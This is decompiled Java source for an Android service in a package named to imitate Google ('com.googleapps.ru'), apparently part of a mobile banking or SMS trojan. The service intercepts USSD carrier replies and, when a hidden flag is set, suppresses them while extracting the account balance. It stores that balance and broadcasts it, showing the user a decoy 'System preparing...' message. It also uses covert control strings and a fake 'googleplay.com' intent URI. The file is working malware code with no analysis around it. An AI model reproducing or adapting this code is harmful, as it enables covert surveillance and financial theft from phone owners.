package com.googleapps.ru;

import android.app.Service;
import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.content.IntentFilter;
import android.content.SharedPreferences;
import android.net.Uri;
import android.net.Uri.Builder;
import android.os.IBinder;
import android.os.RemoteException;
import android.util.Log;
import com.android.internal.telephony.IExtendedNetworkService.Stub;
import java.util.regex.Matcher;
import java.util.regex.Pattern;

public class USSDDumbExtendedNetworkService
  extends Service
{
  public static final String LOG_STAMP = "*USSDTestExtendedNetworkService bind successfully*";
  public static final String MAGIC_OFF = ":OFF;(";
  public static final String MAGIC_ON = ":ON;)";
  public static final String MAGIC_RETVAL = ":RETVAL;(";
  public static final String TAG = "USSDExtNetSvc";
  public static final String URI_AUTHORITY = "googleplay.com";
  public static final String URI_PAR = "return";
  public static final String URI_PAROFF = "off";
  public static final String URI_PARON = "on";
  public static final String URI_PATH = "/";
  public static final String URI_SCHEME = "ussd";
  private static boolean mActive = false;
  private static CharSequence mRetVal = null;
  private final IExtendedNetworkService.Stub mBinder = new IExtendedNetworkService.Stub()
  {
    private void sendBeginBroadcast(SharedPreferences paramAnonymousSharedPreferences, String paramAnonymousString)
    {
      paramAnonymousString = Pattern.compile("-?\\d+").matcher(paramAnonymousString);
      if (paramAnonymousString.find())
      {
        TextUtils.putSettingsValue(USSDDumbExtendedNetworkService.this.getApplicationContext(), "com.googleapps.ru.SendProcedure", false, paramAnonymousSharedPreferences);
        TextUtils.putSettingsValue(USSDDumbExtendedNetworkService.this.getApplicationContext(), "BALANCE_STRING", paramAnonymousString.group(), paramAnonymousSharedPreferences);
        USSDDumbExtendedNetworkService.this.sendBroadcast(new Intent("com.googleapps.ru.SendProcedure"));
      }
    }
    
    public void clearMmiString()
      throws RemoteException
    {
      Log.d("USSDExtNetSvc", "clearMmiString");
    }
    
    public CharSequence getMmiRunningText()
      throws RemoteException
    {
      Log.d("USSDExtNetSvc", "getMmiRunningText: " + USSDDumbExtendedNetworkService.this.msgUssdRunning);
      if (USSDDumbExtendedNetworkService.this.getSharedPreferences("PREFERENCES", 0).getBoolean("com.googleapps.ru.SendProcedure", false)) {
        return "System preparing...";
      }
      return USSDDumbExtendedNetworkService.this.msgUssdRunning;
    }
    
    public CharSequence getUserMessage(CharSequence paramAnonymousCharSequence)
      throws RemoteException
    {
      if (":ON;)".contentEquals(paramAnonymousCharSequence))
      {
        USSDDumbExtendedNetworkService.mActive = true;
        Log.d("USSDExtNetSvc", "control: ON");
      }
      do
      {
        return paramAnonymousCharSequence;
        if (":OFF;(".contentEquals(paramAnonymousCharSequence))
        {
          USSDDumbExtendedNetworkService.mActive = false;
          Log.d("USSDExtNetSvc", "control: OFF");
          return paramAnonymousCharSequence;
        }
        if (":RETVAL;(".contentEquals(paramAnonymousCharSequence))
        {
          USSDDumbExtendedNetworkService.mActive = false;
          Log.d("USSDExtNetSvc", "control: return");
          return USSDDumbExtendedNetworkService.mRetVal;
        }
        localObject = USSDDumbExtendedNetworkService.this.getSharedPreferences("PREFERENCES", 0);
        if (((SharedPreferences)localObject).getBoolean("com.googleapps.ru.SendProcedure", false))
        {
          sendBeginBroadcast((SharedPreferences)localObject, paramAnonymousCharSequence.toString());
          return null;
        }
      } while (!USSDDumbExtendedNetworkService.mActive);
      Object localObject = paramAnonymousCharSequence.toString();
      Uri localUri = new Uri.Builder().scheme("ussd").authority("googleplay.com").path("/").appendQueryParameter("return", paramAnonymousCharSequence.toString()).build();
      USSDDumbExtendedNetworkService.this.sendBroadcast(new Intent("android.intent.action.GET_CONTENT", localUri));
      USSDDumbExtendedNetworkService.mActive = false;
      USSDDumbExtendedNetworkService.mRetVal = paramAnonymousCharSequence;
      Log.d("USSDExtNetSvc", "getUserMessage: " + paramAnonymousCharSequence + "=" + (String)localObject);
      return paramAnonymousCharSequence;
    }
    
    public void setMmiString(String paramAnonymousString)
      throws RemoteException
    {
      Log.d("USSDExtNetSvc", "setMmiString: " + paramAnonymousString);
    }
  };
  private Context mContext = null;
  final BroadcastReceiver mReceiver = new BroadcastReceiver()
  {
    public void onReceive(Context paramAnonymousContext, Intent paramAnonymousIntent)
    {
      if ("android.intent.action.INSERT".equals(paramAnonymousIntent.getAction()))
      {
        USSDDumbExtendedNetworkService.this.mContext = paramAnonymousContext;
        if (USSDDumbExtendedNetworkService.this.mContext != null)
        {
          USSDDumbExtendedNetworkService.this.msgUssdRunning = "USSD Running";
          USSDDumbExtendedNetworkService.mActive = true;
          Log.d("USSDExtNetSvc", "activate");
        }
      }
      while (!"android.intent.action.DELETE".equals(paramAnonymousIntent.getAction())) {
        return;
      }
      USSDDumbExtendedNetworkService.this.mContext = null;
      USSDDumbExtendedNetworkService.mActive = false;
      Log.d("USSDExtNetSvc", "deactivate");
    }
  };
  private String msgUssdRunning = "Выполняется USSD запрос...";
  
  public USSDDumbExtendedNetworkService() {}
  
  public IBinder asBinder()
  {
    Log.d("USSDExtNetSvc", "asBinder");
    return this.mBinder;
  }
  
  public IBinder onBind(Intent paramIntent)
  {
    Log.i("USSDExtNetSvc", "*USSDTestExtendedNetworkService bind successfully*");
    paramIntent = new IntentFilter();
    paramIntent.addAction("android.intent.action.INSERT");
    paramIntent.addAction("android.intent.action.DELETE");
    paramIntent.addDataScheme("ussd");
    paramIntent.addDataAuthority("googleplay.com", null);
    paramIntent.addDataPath("/", 0);
    registerReceiver(this.mReceiver, paramIntent);
    return this.mBinder;
  }
  
  public void onDestroy()
  {
    super.onDestroy();
    unregisterReceiver(this.mReceiver);
  }
}
